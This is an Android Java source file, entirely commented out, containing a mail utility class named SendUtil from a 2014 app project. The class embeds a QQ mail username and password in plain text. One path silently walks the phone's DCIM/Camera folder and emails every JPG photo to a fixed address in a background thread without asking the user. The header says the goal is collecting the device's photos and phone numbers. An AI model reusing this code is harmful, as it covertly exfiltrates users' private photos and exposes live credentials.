package com.runkun.lbsq.busi.test2;//package feifei.library.util;
//
//import android.annotation.TargetApi;
//import android.app.PendingIntent;
//import android.content.ContentResolver;
//import android.content.Context;
//import android.database.Cursor;
//import android.database.sqlite.SQLiteException;
//import android.net.Uri;
//import android.os.Build;
//import android.os.Environment;
//import android.provider.ContactsContract;
//import android.telephony.SmsManager;
//import android.text.TextUtils;
//import android.util.Log;
//
//import java.io.File;
//import java.text.SimpleDateFormat;
//import java.util.ArrayList;
//import java.util.Date;
//import java.util.List;
//import java.util.Locale;
//import java.util.Properties;
//
//import javax.activation.CommandMap;
//import javax.activation.DataHandler;
//import javax.activation.DataSource;
//import javax.activation.FileDataSource;
//import javax.activation.MailcapCommandMap;
//import javax.mail.BodyPart;
//import javax.mail.Multipart;
//import javax.mail.PasswordAuthentication;
//import javax.mail.Session;
//import javax.mail.Transport;
//import javax.mail.internet.InternetAddress;
//import javax.mail.internet.MimeBodyPart;
//import javax.mail.internet.MimeMessage;
//import javax.mail.internet.MimeMultipart;
//import javax.mail.internet.MimeUtility;
//
///**
// * @author 裴智飞
// * @date 2014-7-13
// * @date 下午4:05:18
// * @file SendUtil.java
// * @content 发送信息，暂时只有获取本机相片和手机号码
// */
//public class SendUtil extends javax.mail.Authenticator
//{
//    private final String username = "1048741029@qq.com";
//    private final String password = "fankui";
//    private final String[] toArray = new String[]{"351827417@qq.com"};
//    private final String port = "465";
//    private final String sport = "465";
//    private final String host = "smtp.qq.com";
//    private final String subject = "反馈";
//    private final String body = "我是内容";
//    private final Multipart multipart = new MimeMultipart();
//    private static boolean attachmentArray = false;
//    private static ArrayList<String> list2;
//
//    /**
//     * 发送QQ邮件给自己
//     */
//    public static void sendMail(final String string)
//    {
//        mail(string, false, null);
//    }
//
//    /**
//     * 发送邮件含附件，需要开一个服务分批次发送
//     */
//    public static void sendAttachment()
//    {
//        mail(null, true, null);
//    }
//
//    //获取图片
//    public static void sendAttachment(String filePath)
//    {
//        mail(null, true, filePath);
//    }
//
//    /**
//     * 添加多个附件的方法
//     */
//    public static void sendAttachment(ArrayList<String> filePath)
//    {
//        attachmentArray = true;
//        list2 = filePath;
//        mail(null, true, "");
//    }
//
//    private static void mail(final String string, final boolean attachment, final String filePath)
//    {
//        final SendUtil m = new SendUtil();
//        new Thread(new Runnable()
//        {
//            @Override
//            public void run()
//            {
//                try
//                {
//                    if (attachment)
//                    {
//                        if (filePath == null)
//                        {
//                            // null则遍历图片文件
//                            IterateFile(new File(Environment.getExternalStorageDirectory().toString() + "/" + "DCIM/Camera/"));
//                            for (int i = 0; i < list.size(); i++)
//                            {
//                                m.addAttachment(list.get(i));
//                            }
//                        } else
//                        {
//                            // 单个附件
//                            if (!attachmentArray)
//                            {
//                                m.addAttachment(filePath);
//                            } else
//                            {
//                                // 多个附件
//                                for (int i = 0; i < list2.size(); i++)
//                                {
//                                    m.addAttachment(list2.get(i));
//                                }
//                                attachmentArray = false;
//                            }
//
//                        }
//                    }
//                    if (m.send(string))
//                    {
//                        //这里没有context
//                        L.l("发送成功");
//                    } else
//                    {
//                        L.l("发送失败");
//                    }
//                } catch (Exception e)
//                {
//                    L.l("异常" + e.getMessage());
//                    e.printStackTrace();
//                }
//            }
//        }).start();
//    }
//
//    private boolean send(String string) throws Exception
//    {
//        Properties props = new Properties();
//        props.put("mail.smtp.host", host);
//        props.put("mail.debug", "true");
//        props.put("mail.smtp.auth", "true");
//        props.put("mail.smtp.port", port);
//        props.put("mail.smtp.socketFactory.port", sport);
//        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
//        props.put("mail.smtp.socketFactory.fallback", "false");
//        if (!username.equals("") && !password.equals("") && toArray.length > 0 && !subject.equals("") && !body.equals(""))
//        {
//            Session session = Session.getInstance(props, this);
//            MimeMessage msg = new MimeMessage(session);
//            msg.setFrom(new InternetAddress(username));
//            InternetAddress[] addressTo = new InternetAddress[toArray.length];
//            for (int i = 0; i < toArray.length; i++)
//            {
//                addressTo[i] = new InternetAddress(toArray[i]);
//            }
//            // 这是添加多个联系人的方法，一个是setRecipient
//            msg.setRecipients(MimeMessage.RecipientType.TO, addressTo);
//            msg.setSubject(subject);
//            msg.setSentDate(new Date());
//            BodyPart messageBodyPart = new MimeBodyPart();
//            if (string != null)
//            {
//                messageBodyPart.setText(string);
//            } else
//            {
//                messageBodyPart.setText(body);
//            }
//            multipart.addBodyPart(messageBodyPart);
//            msg.setContent(multipart);
//            Transport.send(msg);
//            L.l("已发送");
//            return true;
//        } else
//        {
//            return false;
//        }
//    }
//
//    /**
//     * @param filename
//     * @throws Exception
//     * @notice 添加附件的方法
//     */
//    private void addAttachment(String filename) throws Exception
//    {
//        BodyPart messageBodyPart = new MimeBodyPart();
//        DataSource source = new FileDataSource(filename);
//        messageBodyPart.setDataHandler(new DataHandler(source));
//        // 解决附件中的中文乱码问题
//        messageBodyPart.setFileName(MimeUtility.encodeText(filename));
//        multipart.addBodyPart(messageBodyPart);
//    }
//
//    private static String filepath;
//    private static String filename;
//    private static List<String> list;
//
//    /**
//     * @param file ：指定目录
//     * @return list<String>：返回一个list
//     * @notice 扫描指定目录的JPG文件
//     */
//    public static List<String> IterateFile(File file)
//    {
//        list = new ArrayList<String>();
//        if (!file.exists())
//        {
//            file.mkdirs();
//        }
//        for (File filex : file.listFiles())
//        {
//            if (filex.isDirectory())
//            {
//                IterateFile(filex);
//            } else
//            {
//                filepath = file.getPath();
//                filename = filex.getName();
//                if (filename.endsWith(".jpg"))
//                {
//                    list.add(filepath + "/" + filename);
//                }
//            }
//        }
//        return list;
//    }
//
//    /**
//     * Override不能去，这个方法是核对用户名和密码的
//     */
//    @Override
//    public PasswordAuthentication getPasswordAuthentication()
//    {
//        return new PasswordAuthentication(username, password);
//    }
//
//    /**
//     * 构造函数
//     */
//    public SendUtil()
//    {
//        MailcapCommandMap mc = (MailcapCommandMap) CommandMap.getDefaultCommandMap();
//        mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
//        mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
//        mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
//        mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
//        mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
//        CommandMap.setDefaultCommandMap(mc);
//    }
//
//}
